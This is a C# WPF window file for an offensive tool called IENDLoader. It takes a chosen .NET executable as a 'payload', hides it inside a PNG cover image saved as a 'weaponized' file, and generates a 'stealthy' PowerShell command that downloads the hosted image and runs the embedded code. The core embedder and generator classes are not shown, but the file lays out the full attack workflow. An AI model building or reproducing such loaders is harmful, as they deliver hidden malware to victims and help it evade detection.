using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using Microsoft.Win32;
using IENDLoader.Core;
using IENDLoader.Helpers;

namespace IENDLoader
{
    public partial class MainWindow : Window
    {
        private string? _payloadPath;
        private string? _imagePath;
        private string? _weaponizedPath;
        private readonly PayloadEmbedder _embedder;
        private readonly PowerShellGenerator _generator;

        public MainWindow()
        {
            try
            {
                InitializeComponent();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "XAML Load Error", MessageBoxButton.OK, MessageBoxImage.Error);
                throw;
            }
            _embedder = new PayloadEmbedder();
            _generator = new PowerShellGenerator();

            // Ensure entry point UI state is consistent after InitializeComponent
            ApplyEntryPointMode();
        }

        private void BrowsePayloadButton_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Title = "Select .NET Assembly",
                Filter = "Executable files (*.exe)|*.exe|DLL files (*.dll)|*.dll|All files (*.*)|*.*",
                CheckFileExists = true
            };

            if (dialog.ShowDialog() == true)
            {
                _payloadPath = dialog.FileName;
                string filename = Path.GetFileName(_payloadPath);
                PayloadPathText.Text = filename;
                PayloadPathText.Foreground = new SolidColorBrush(Color.FromRgb(0, 255, 0));
                UpdateStatus($"Payload selected: {filename}");
                AnimateButton(BrowsePayloadButton);
            }
        }

        private void BrowseImageButton_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Title = "Select Cover Image",
                Filter = "PNG files (*.png)|*.png|All files (*.*)|*.*",
                CheckFileExists = true
            };

            if (dialog.ShowDialog() == true)
            {
                _imagePath = dialog.FileName;
                string filename = Path.GetFileName(_imagePath);
                ImagePathText.Text = filename;
                ImagePathText.Foreground = new SolidColorBrush(Color.FromRgb(0, 255, 0));
                UpdateStatus($"Image selected: {filename}");
                AnimateButton(BrowseImageButton);
            }
        }

        private async void EmbedButton_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrEmpty(_payloadPath) || string.IsNullOrEmpty(_imagePath))
            {
                MessageBox.Show("Please select both payload and image first", "Error", 
                    MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            var saveDialog = new SaveFileDialog
            {
                Title = "Save Weaponized Image",
                Filter = "PNG files (*.png)|*.png",
                FileName = $"weaponized_{Path.GetFileNameWithoutExtension(_imagePath)}.png",
                DefaultExt = ".png"
            };

            if (saveDialog.ShowDialog() != true)
                return;

            string outputPath = saveDialog.FileName;

            // Show progress
            EmbedProgressBar.Visibility = Visibility.Visible;
            EmbedProgressBar.IsIndeterminate = false;
            EmbedProgressBar.Value = 0;
            EmbedStatusText.Text = "Embedding...";
            EmbedStatusText.Foreground = new SolidColorBrush(Color.FromRgb(255, 170, 0));
            EmbedButton.IsEnabled = false;

            try
            {
                await Task.Run(() =>
                {
                    _embedder.EmbedPayload(_imagePath, _payloadPath, outputPath, progress =>
                    {
                        Dispatcher.Invoke(() =>
                        {
                            EmbedProgressBar.Value = progress * 100;
                        });
                    });
                });

                _weaponizedPath = outputPath;
                string filename = Path.GetFileName(outputPath);
                EmbedStatusText.Text = filename;
                EmbedStatusText.Foreground = new SolidColorBrush(Color.FromRgb(0, 255, 0));
                UpdateStatus($"Weaponized image created: {filename}");
                AnimateButton(EmbedButton);

                // Auto-fill URL
                AutoFillUrl();
                UpdateStatus("Ready to generate PowerShell command");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Embedding failed: {ex.Message}", "Error", 
                    MessageBoxButton.OK, MessageBoxImage.Error);
                EmbedStatusText.Text = "Failed";
                EmbedStatusText.Foreground = new SolidColorBrush(Color.FromRgb(255, 0, 0));
            }
            finally
            {
                EmbedProgressBar.Visibility = Visibility.Collapsed;
                EmbedButton.IsEnabled = true;
            }
        }

        private void AutoEntryPointSwitch_Toggled(object sender, RoutedEventArgs e)
        {
            // This event may fire during XAML load before all named elements are available
            if (ManualEntryPointPanel == null || AutoEntryPointSwitch == null)
                return;
            ApplyEntryPointMode();
        }

        private void ApplyEntryPointMode()
        {
            if (ManualEntryPointPanel == null || AutoEntryPointSwitch == null)
                return;

            if (AutoEntryPointSwitch.IsChecked == true)
            {
                ManualEntryPointPanel.Visibility = Visibility.Collapsed;
                UpdateStatus("Auto-discovery enabled");
            }
            else
            {
                ManualEntryPointPanel.Visibility = Visibility.Visible;
                UpdateStatus("Manual entry point - specify target method");
            }
        }

        private void AutoFillButton_Click(object sender, RoutedEventArgs e)
        {
            AutoFillUrl();
        }

        private void AutoFillUrl()
        {
            if (string.IsNullOrEmpty(_weaponizedPath))
                return;

            string filename = Path.GetFileName(_weaponizedPath);
            string url = NetworkHelper.GenerateDefaultUrl(filename);
            ImageUrlTextBox.Text = url;
        }

        private void GenerateButton_Click(object sender, RoutedEventArgs e)
        {
            string url = ImageUrlTextBox.Text.Trim();

            if (string.IsNullOrWhiteSpace(url))
            {
                MessageBox.Show("Please enter the hosted image URL first", "Missing URL", 
                    MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            UpdateStatus("Generating stealthy PowerShell command...");
            AnimateButton(GenerateButton);

            try
            {
                bool autoDiscover = AutoEntryPointSwitch.IsChecked == true;
                string? manualEntryPoint = autoDiscover ? null : EntryPointTextBox.Text.Trim();

                string command = _generator.GenerateCommand(url, autoDiscover, manualEntryPoint);

                CommandTextBox.Text = command;
                UpdateStatus("PowerShell command generated successfully!");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Generation failed: {ex.Message}", "Error", 
                    MessageBoxButton.OK, MessageBoxImage.Error);
                UpdateStatus("Generation failed");
            }
        }

        private void CopyButton_Click(object sender, RoutedEventArgs e)
        {
            string command = CommandTextBox.Text.Trim();

            if (string.IsNullOrWhiteSpace(command) || command.StartsWith("Click"))
            {
                MessageBox.Show("Generate the command first", "Warning", 
                    MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            try
            {
                Clipboard.SetText(command);
                UpdateStatus("Command copied to clipboard");
                AnimateButton(CopyButton);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to copy: {ex.Message}", "Error", 
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void UpdateStatus(string message)
        {
            StatusText.Text = message;
            AnimateStatus();
        }

        private async void AnimateButton(System.Windows.Controls.Button button)
        {
            var originalBrush = button.Background;
            button.Background = new SolidColorBrush(Color.FromRgb(0, 255, 0));
            await Task.Delay(200);
            button.Background = originalBrush;
        }

        private async void AnimateStatus()
        {
            var colors = new[]
            {
                Color.FromRgb(0, 255, 0),
                Color.FromRgb(0, 204, 0),
                Color.FromRgb(0, 255, 0)
            };

            foreach (var color in colors)
            {
                StatusText.Foreground = new SolidColorBrush(color);
                await Task.Delay(100);
            }
        }
    }
}
